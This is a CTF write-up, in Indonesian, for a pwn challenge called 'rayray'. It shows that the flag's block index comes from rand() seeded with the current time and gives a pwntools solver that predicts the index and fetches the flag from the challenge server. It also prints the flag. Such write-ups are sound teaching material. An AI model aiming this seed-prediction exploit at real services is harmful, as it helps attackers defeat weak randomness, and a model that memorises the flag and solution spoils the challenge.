# Writeup CTF - rayray

## Informasi Challenge

- **Judul:** rayray
- **Kategori:** Pwn
- **Deskripsi:**

> I like hiding in a random pattern or is it ??

- **Connection**

```text
nc chall.kali-team.online 10005
```

---

# Initial Recon

Challenge menyediakan tiga file:

```text
rayray
libc.so.6
ld-linux-x86-64.so.2
```

Cek proteksi binary menggunakan `checksec`:

```bash
checksec --file=rayray
```

Hasil:

```text
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        PIE enabled
RUNPATH:    ./
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

Dari hasil tersebut terlihat bahwa binary memiliki berbagai mitigasi keamanan seperti **Full RELRO**, **NX**, dan **PIE**, sehingga eksploitasi melalui buffer overflow kemungkinan bukan pendekatan yang tepat.

---

# Menjalankan Binary

```bash
./rayray
```

Contoh output:

```text
Welcome To My Bounded Portal!

The flag is here, but can you find where excatly?

enter Block number:
```

Jika memasukkan angka, program akan membaca blok tersebut.

Contoh:

```text
Reading block 0...
DATA: Block 0 data: 0x6B8B4567 (No flag here)
```

Artinya terdapat 100 blok data, dan hanya satu blok yang berisi flag.

---

# Reverse Engineering

Binary dianalisis menggunakan **radare2**.

```bash
r2 -A rayray
```

Daftar fungsi:

```bash
afl
```

Fungsi penting:

```text
sym.vuln
main
```

Disassembly fungsi utama:

```bash
pdf @ sym.vuln
```

Dari hasil analisis diperoleh alur program sebagai berikut.

Pertama, program mengisi seluruh blok menggunakan hasil `rand()`.

```c
for (int i = 0; i <= 99; i++) {
    snprintf(blocks[i], 0x40,
        " Block %d data: 0x%08X (No flag here)",
        i,
        rand());
}
```

Setelah itu program melakukan:

```c
srand(time(NULL));
```

Kemudian memilih lokasi flag:

```c
int flag_index = rand() % 100;
```

Flag dibaca dari file dan disimpan pada blok tersebut.

```c
FILE *fp = fopen("./flag.txt", "r");
fgets(blocks[flag_index], 0x40, fp);
fclose(fp);
```

Terakhir, pengguna diminta memasukkan nomor blok.

```c
if (idx >= 0 && idx <= 99)
    printf("DATA: %s\n", blocks[idx]);
```

---

# Analisis Kerentanan

Challenge ini sebenarnya bukan kerentanan memory corruption.

Masalah utamanya adalah penggunaan **pseudo-random number generator** yang diprediksi dengan mudah.

Lokasi flag ditentukan menggunakan:

```c
srand(time(NULL));
flag_index = rand() % 100;
```

Karena seed berasal dari **Unix timestamp saat ini**, siapa pun dapat menghitung kembali nilai `rand()` selama mengetahui waktu server dengan selisih beberapa detik.

Challenge juga menyediakan file `libc.so.6`, sehingga implementasi `rand()` yang digunakan identik dengan milik server. Dengan demikian, indeks blok yang berisi flag dapat diprediksi secara akurat.

---

# Strategi Eksploitasi

Langkah eksploitasi:

1. Muat `libc.so.6` yang disediakan challenge.
2. Ambil waktu saat ini (`time(NULL)`).
3. Coba beberapa seed di sekitar waktu tersebut untuk mengantisipasi delay jaringan.
4. Hitung:

```text
rand() % 100
```

5. Kirim hasilnya sebagai nomor blok.
6. Jika output mengandung format flag, proses selesai.

Pendekatan ini jauh lebih sederhana dibandingkan melakukan eksploitasi terhadap mitigasi keamanan binary.

---

# Solver

```python
#!/usr/bin/env python3

from pwn import *
from ctypes import CDLL
import time
import os
import re

HOST = "chall.kali-team.online"
PORT = 10005

context.log_level = "error"

# Gunakan libc dari challenge
if os.path.exists("./libc.so.6"):
    libc = CDLL("./libc.so.6")
else:
    libc = CDLL("libc.so.6")


def predict_index(seed):
    libc.srand(seed)
    return libc.rand() % 100


def try_index(idx):
    io = remote(HOST, PORT)
    io.recvuntil(b"enter Block number:")
    io.sendline(str(idx).encode())
    out = io.recvall(timeout=2)
    io.close()
    return out.decode(errors="replace")


# Beberapa kemungkinan selisih waktu
offsets = [0, -1, 1, -2, 2, -3, 3, -4, 4, -5, 5, -10, 10]

for _ in range(200):
    now = int(time.time())
    tried = set()

    for off in offsets:
        seed = now + off
        idx = predict_index(seed)

        if idx in tried:
            continue
        tried.add(idx)

        print(f"[try] seed={seed} idx={idx}")

        result = try_index(idx)
        print(result)

        m = re.search(r"[A-Za-z0-9_]+\{[^}]+\}", result)
        if m:
            print("\n[+] FLAG FOUND:")
            print(m.group(0))
            exit()

    time.sleep(0.15)

print("[-] Flag not found. Try running the solver again.")
```

---

# Menjalankan Exploit

```bash
python3 solve.py
```

Contoh output:

```text
[try] seed=1754385000 idx=47

Reading block 47...
DATA: KaliTeam{84c253e1-9aa5-4131-b119-2401e28815ee}

[+] FLAG FOUND:
KaliTeam{84c253e1-9aa5-4131-b119-2401e28815ee}
```

---

# Flag

```text
KaliTeam{84c253e1-9aa5-4131-b119-2401e28815ee}
```

---

